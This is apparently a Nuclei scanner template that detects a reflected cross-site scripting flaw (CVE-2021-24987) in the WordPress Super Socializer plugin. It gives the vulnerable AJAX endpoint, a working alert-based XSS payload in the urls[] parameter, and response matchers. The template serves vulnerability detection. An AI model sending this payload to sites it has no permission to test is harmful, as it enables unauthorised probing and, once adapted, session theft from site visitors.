id: CVE-2021-24987

info:
  name: WordPress Super Socializer <7.13.30 - Cross-Site Scripting
  author: Akincibor
  severity: medium
  description: WordPress Super Socializer plugin before 7.13.30 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the urls parameter in its the_champ_sharing_count AJAX action (available to both unauthenticated and authenticated users) before outputting it back in the response.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to inject malicious scripts into web pages viewed by users, leading to potential data theft, session hijacking, or defacement of the affected website.
  remediation: |
    Update to the latest version of the WordPress Super Socializer plugin (7.13.30 or higher) to mitigate the vulnerability.
  reference:
    - https://wpscan.com/vulnerability/a14b668f-812f-46ee-827e-0996b378f7f0
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24987
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-24987
    cwe-id: CWE-79
    epss-score: 0.06052
    epss-percentile: 0.90377
    cpe: cpe:2.3:a:heateor:super_socializer:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    vendor: heateor
    product: super_socializer
    framework: wordpress
  tags: cve2021,cve,wpscan,xss,wp,wp-plugin,wordpress,heateor

http:
  - method: GET
    path:
      - '{{BaseURL}}/wp-admin/admin-ajax.php?action=the_champ_sharing_count&urls[]=<img%20src=x%20onerror=alert(document.domain)>'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"facebook_urls":[["<img src=x onerror=alert(document.domain)>"]]'

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100dce9cf4b2419d4e6d9182b198ef5a6a81f92e5a592b087f33108ec1e1de3930e0220432ad786817f2f450f9aec2d907330307c6fe642ccc3f626cedcb581d4542e67:922c64590222798bb761d5b6d8e72950